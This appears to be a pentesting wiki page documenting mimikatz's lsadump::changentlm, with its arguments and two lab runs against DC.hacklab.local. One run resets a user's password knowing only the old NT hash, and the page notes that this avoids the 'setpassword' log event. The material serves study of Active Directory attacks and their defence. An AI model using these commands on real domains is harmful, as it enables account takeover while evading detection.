# changentlm

`lsadump::changentlm` can be used to change the password of a user. It accepts either a clear-text password or an NT hash. [According to Benjamin](https://twitter.com/gentilkiwi/status/872588656967548928?s=20) this option avoids the "setpassword" event but it requires to know the previous password or NT hash. It has the following command line arguments:

* `/newpassword`: The new clear text password for the target user
* `/oldpassword` : The existing clear text password to change
* `/user`: the target user account
* `/oldntlm` or `/old` : The existing NT hash to change
* `/newntlm` or `/new` : The new NT hash for the target user
* `/server`: The domain controller FQDN

{% hint style="info" %}
LM and NT hashes are used to authenticate accounts using the NTLM protocol. These hashes are often called NTLM hash and many documentations, resources, blogpost and tools mix terms. In this case, "ntlm" refers to the NT hash.

([more information](https://www.thehacker.recipes/ad/movement/ntlm))
{% endhint %}

{% hint style="info" %}
A low privileged user can also utilise it to change his/her own password.
{% endhint %}

```
mimikatz # lsadump::changentlm /server:DC.hacklab.local /user:adriane.lena /old:cded5acd2c1fc0f816c63ef317937deb /newpassword:WhatEverYouWant
OLD NTLM     : cded5acd2c1fc0f816c63ef317937deb
NEW NTLM     : e0e12e5f0fba8f1efbff3a7ceea6e907

Target server: DC.hacklab.local
Target user  : adriane.lena
Domain name  : hacklab
Domain SID   : S-1-5-21-2725560159-1428537199-2260736313
User RID     : 1479

>> Change password is a success!
```

While [lsadump::setntlm](setntlm.md) seems to work multiple times for the same user account, this is not the case for `lsadump::changentlm`. According to this [issue](https://github.com/gentilkiwi/mimikatz/issues/201) on mimikatz's Github, a user cannot change his password more than one per day.

```
mimikatz # lsadump::changentlm /server:DC.hacklab.local /user:optimus /old:b09a14d2d325026f8986d4a874fbcbc7 /newpassword:WhatEverYouWant
OLD NTLM     : b09a14d2d325026f8986d4a874fbcbc7
NEW NTLM     : e0e12e5f0fba8f1efbff3a7ceea6e907

Target server: DC.hacklab.local
Target user  : optimus
Domain name  : hacklab
Domain SID   : S-1-5-21-2725560159-1428537199-2260736313
User RID     : 1732
ERROR kuhl_m_lsadump_changentlm_callback ; Bad new NTLM hash or password! (restriction)
```
